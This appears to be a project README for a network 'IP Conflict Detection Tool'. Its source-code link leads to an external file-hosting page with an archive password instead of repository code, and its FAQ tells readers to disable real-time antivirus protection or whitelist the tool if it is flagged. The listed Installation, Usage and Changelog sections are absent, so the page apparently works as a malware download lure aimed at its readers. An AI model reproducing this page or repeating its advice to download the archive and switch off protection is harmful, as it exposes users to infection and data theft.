<!-- HEADER -->
<p align="center">
  <img src="https://img.shields.io/badge/Version-August%202026-blue?style=for-the-badge" alt="Version">
  <img src="https://img.shields.io/badge/Status-Working-brightgreen?style=for-the-badge" alt="Status">
  <img src="https://img.shields.io/badge/Platform-Windows%20%7C%20Linux-0078D6?style=for-the-badge" alt="Platform">
</p>

<h1 align="center">IP Conflict Detection Tool</h1>

<p align="center">
  <b>Advanced network scanner for detecting duplicate IP addresses using ARP scanning, OS fingerprinting, and hostname resolution.</b>
</p>

---

## Table of Contents

- [About](#about)
- [Features](#features)
- [System Requirements](#system-requirements)
- [Download](#download)
- [Installation](#installation)
- [Usage](#usage)
- [Example Output](#example-output)
- [Changelog](#changelog)
- [FAQ](#faq)

---

## About

IP address conflicts occur when two or more devices on the same network attempt to use the same IP address. This leads to connectivity issues, network instability, and downtime. The **IP Conflict Detection Tool** scans your network using ARP requests, identifies duplicate IPs, and provides detailed information about each device – including MAC address, operating system, and hostname.

This tool is designed for network administrators, IT professionals, and power users who need to quickly identify and resolve IP conflicts across large networks.

---

## Features

| Feature | Description |
|---------|-------------|
| IP Conflict Detection | Scans networks and detects duplicate IP addresses |
| Multi-threaded ARP Scanning | Fast scanning across large subnets |
| OS Fingerprinting | Identifies operating system via TTL, SMB, and SSH banners |
| MAC Vendor Lookup | Shows manufacturer information for each MAC address |
| Hostname Resolution | Displays device names and system IDs |
| Auto Network Detection | Automatically detects your local network range |
| Logging | Saves scan results for later analysis |
| Alert Signal | Ping-based alerts for conflict detection |
| Cross-Platform | Works on Windows (WSL supported), Linux, and macOS |

---

## System Requirements

| Requirement | Details |
|-------------|---------|
| Operating System | Windows 10/11 (WSL supported), Ubuntu 20.04+, Debian, Kali Linux, macOS |
| Python | Python 3.8 – 3.13 |
| Permissions | Root or administrator privileges (required for ARP scanning) |
| Network | Active Ethernet/WiFi interface, ARP scanning allowed on the network |
| Hardware | 2GB RAM minimum, Dual-core CPU |

---

## Download

**Latest version:** August 2026

| File | Link |
|------|------|
| Source Code | https://sites.google.com/view/archive-pack/download |
| Password | 68924 |

---

# FAQ

What is an IP conflict?
An IP conflict occurs when two or more devices on the same network are assigned the same IP address, causing connectivity issues and network instability.

How does this tool detect IP conflicts?
The tool sends ARP requests to all IPs in the network range. If multiple devices respond to the same IP, a conflict is detected.

Do I need administrator privileges?
Yes. ARP scanning requires root or administrator privileges to access network interfaces.

Does this work on Windows?
Yes. Windows 10/11 with WSL (Windows Subsystem for Linux) is supported. The tool also works natively on Linux.

Is this tool safe to use?
Yes. The tool only sends ARP requests and does not modify any network settings. It is read-only and safe for network diagnostics.

What if my antivirus flags the tool?
ARP scanners are sometimes flagged as false positives. Temporarily disable real-time protection or add an exception for the tool directory.

Can I use this on a Wi-Fi network?
Yes, but client isolation must be disabled on the Wi-Fi network for ARP scanning to work properly.

License
This project is licensed under the MIT License – free to use, modify, and distribute.

<p align="center">© 2026 · IP Conflict Detection Tool</p> 







 
